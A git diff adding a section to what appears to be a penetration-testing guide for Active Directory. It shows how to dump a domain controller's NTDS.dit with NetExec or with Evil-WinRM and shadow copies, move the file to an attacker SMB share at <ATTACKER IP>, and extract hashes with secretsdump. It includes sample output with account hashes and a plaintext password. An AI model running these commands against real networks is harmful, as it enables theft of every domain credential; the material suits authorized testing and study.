@@ -2405,13 +2405,77 @@ Once credentials are obtained, we can attempt to gain remote access to the Domai
 
 NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. The `NTDS.dit` file, located at `%systemroot%\NTDS` on domain controllers, is the core database of Active Directory—“.dit” stands for Directory Information Tree. This file contains all domain usernames, password hashes, and critical schema data. If an attacker captures it, they could potentially compromise every account in the domain.
 
+We have two options to obtain this file:
+
+
 <details>
-<summary><h4>Connecting to a DC with Evil-WinRM</h4></summary>
+<summary><h4>Option 1: Automatic</h4></summary>
+
+Using NetExec to capture NTDS.dit
+
+```bash
+netexec smb <DC IP>  -u <USERNAME> -p <PASSWORD> -M ntdsutil
+```
+
+Example output
+
+```bash
+# SMB         <DC IP>   445     DC01         [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:exampledomain.local) (signing:True) (SMBv1:False)
+# SMB         <DC IP>   445     DC01         [+] exampledomain.local\bwilliamson:P@55w0rd! (Pwn3d!)
+# NTDSUTIL    <DC IP>   445     DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\174556000
+# NTDSUTIL    <DC IP>   445     DC01         Dumping the NTDS, this could take a while so go grab a redbull...
+# NTDSUTIL    <DC IP>   445     DC01         [+] NTDS.dit dumped to C:\Windows\Temp\174556000
+# NTDSUTIL    <DC IP>   445     DC01         [*] Copying NTDS dump to /tmp/tmpcw5zqy5r
+# NTDSUTIL    <DC IP>   445     DC01         [*] NTDS dump copied to /tmp/tmpcw5zqy5r
+# NTDSUTIL    <DC IP>   445     DC01         [+] Deleted C:\Windows\Temp\174556000 remote dump directory
+# NTDSUTIL    <DC IP>   445     DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
+# NTDSUTIL    <DC IP>   445     DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+# NTDSUTIL    <DC IP>   445     DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# NTDSUTIL    <DC IP>   445     DC01         DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
+# NTDSUTIL    <DC IP>   445     DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
+# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
+# NTDSUTIL    <DC IP>   445     DC01         WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
+# NTDSUTIL    <DC IP>   445     DC01         WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::
+# NTDSUTIL    <DC IP>   445     DC01         WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::
+# NTDSUTIL    <DC IP>   445     DC01         WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::
+# NTDSUTIL    <DC IP>   445     DC01         WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::
+# NTDSUTIL    <DC IP>   445     DC01         WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::
+# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
+# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
+# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\jjohnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
+# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+# NTDSUTIL    <DC IP>   445     DC01         Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
+# NTDSUTIL    <DC IP>   445     DC01         Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
+# NTDSUTIL    <DC IP>   445     DC01         Administrator:des-cbc-md5:618c1c5ef780cde3
+# NTDSUTIL    <DC IP>   445     DC01         DC01$:aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
+# NTDSUTIL    <DC IP>   445     DC01         DC01$:aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d
+# NTDSUTIL    <DC IP>   445     DC01         DC01$:des-cbc-md5:a2852362e50eae92
+# NTDSUTIL    <DC IP>   445     DC01         krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
+# NTDSUTIL    <DC IP>   445     DC01         krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9
+# NTDSUTIL    <DC IP>   445     DC01         krbtgt:des-cbc-md5:9bd5017fdcea8fae
+# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\jim:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
+# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\jim:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263
+# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\jim:des-cbc-md5:79ab08755b32dfb6
+# NTDSUTIL    <DC IP>   445     DC01         WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
+# NTDSUTIL    <DC IP>   445     DC01         WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-
+# NTDSUTIL    <DC IP>   445     DC01         [+] Dumped 61 NTDS hashes to /home/bob/.nxc/logs/DC01_<DC IP>_2025-04-25_084640.ntds of which 15 were added to the database
+# NTDSUTIL    <DC IP>   445    DC01          [*] To extract only enabled accounts from the output file, run the following command: 
+# NTDSUTIL    <DC IP>   445    DC01          [*] grep -iv disabled /home/bob/.nxc/logs/DC01_<DC IP>_2025-04-25_084640.ntds | cut -d ':' -f1
+```
+
+</details>
+
+<details>
+<summary><h4>Option 2: Manual</h4></summary>
+
+<details>
+<summary><h5>Connecting to a DC with Evil-WinRM</h5></summary>
 
 We can connect to a target DC using the credentials we captured.
 
 ```bash
-evil-winrm -i <DC IP>  -u <USERNAME> -p '<PASSWORD>'
+evil-winrm -i <DC IP>  -u <USERNAME> -p <PASSWORD>
 ```
 
 > Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.
@@ -2419,7 +2483,7 @@ evil-winrm -i <DC IP>  -u <USERNAME> -p '<PASSWORD>'
 </details>
 
 <details>
-<summary><h4>Checking local group membership</h4></summary>
+<summary><h5>Checking local group membership</h5></summary>
 
 Once connected, we can check to see what privileges this user has. 
 
@@ -2440,7 +2504,7 @@ This account has both Administrators and Domain Administrator rights which means
 </details>
 
 <details>
-<summary><h4>Creating shadow copy of C:</h4></summary>
+<summary><h5>Creating shadow copy of C:</h5></summary>
 
 We can use vssadmin to create a [Volume Shadow Copy](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (VSS) of the C: drive or whatever volume the admin chose when initially installing AD.
 
@@ -2466,13 +2530,42 @@ Expected output
 </details>
 
 <details>
-<summary><h4>Copying NTDS.dit from the VSS</h4></summary>
+<summary><h5>Copying NTDS.dit from the VSS</h5></summary>
 
 We can then copy the `NTDS.dit` file from the volume shadow copy of the C: drive to another location on the system, preparing it for transfer to our attack host.
 
 ```bash
 *Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 ```
+
+Then, transfer the files from the target machine to the attack machine
+
+**Attack Machine:** Create a share with smbserver
+
+```bash
+mkdir ~/ntds
+sudo smbserver.py -smb2support share ~/ntds
+```
+
+**Target Machine:** Transfer the hive copies to the share
+
+```bash
+*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\<ATTACKER IP>\share 
+```
+
+</details>
+
+<details>
+<summary><h5>Extracting hashes from NTDS.dit</h5></summary>
+
+With a copy of NTDS.dit on our attack host, we can go ahead and dump the hashes. One way to do this is with Impacket's secretsdump:
+
+```bash
+cd ~/ntds
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+```
+
+</details>
 
 </details>
 
